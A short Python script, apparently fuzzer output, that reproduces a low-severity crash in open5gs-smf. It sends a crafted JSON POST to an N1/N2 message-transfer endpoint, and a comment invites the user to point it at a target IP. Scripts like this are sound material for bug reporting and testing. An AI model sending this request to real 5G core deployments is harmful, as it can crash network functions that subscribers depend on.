#!/usr/bin/env python3
# Crash reproduction for open5gs-smf (low)
# Detected: Sat May  9 01:11:08 2026
import http.client, json

host, port = '127.0.0.1', 80  # Update to target IP
method = 'POST'
path = '/namf-comm/v1/ue-contexts/test-ue-001/n1-n2-messages'
body = b'{"n1MessageContainer": {"n1MessageClass": "5GMM", "n1MessageContent": {"contentId": "nas-msg-001"}}, "n2InfoContainer": {"n2InformationClass": "NR"}}'
conn = http.client.HTTPConnection(host, port, timeout=10)
headers = {'Content-Type': 'application/json'}
if body:
    conn.request(method, path, body=body, headers=headers)
else:
    conn.request(method, path, headers=headers)
resp = conn.getresponse()
print(f'Status: {resp.status}')
print(f'Body: {resp.read()[:500]}')
